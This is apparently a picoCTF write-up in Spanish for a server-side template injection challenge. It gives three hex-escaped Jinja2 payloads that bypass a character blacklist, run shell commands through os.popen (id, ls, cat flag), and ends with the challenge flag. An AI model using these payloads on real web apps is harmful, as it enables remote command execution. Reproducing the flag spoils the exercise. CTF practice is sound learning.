
**Description:**
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:53483/)!

**Hints:**
1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?



**Solución 1**

```

- Analizamos que se pude enviar cosas, y caracteres en el formulario de la página principal
- Vamos pyjali ssti a traer un código de inyección:
"{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
"

- Vamos a hacer una cambio en la propiedad .popen, para lista los elementos que hay:
"{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
"

- Leemos lo que tenga el archivo flag, con cat:
"{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
"
	- Nos aparecerá la bandera luego de dar click en el OK
```


## Respuesta: **picoCTF{sst1_f1lt3r_byp4ss_7c36c7f}**

---
Referencias:
- https://www.youtube.com/watch?v=HiC8a6BjXDI
- pyjali ssti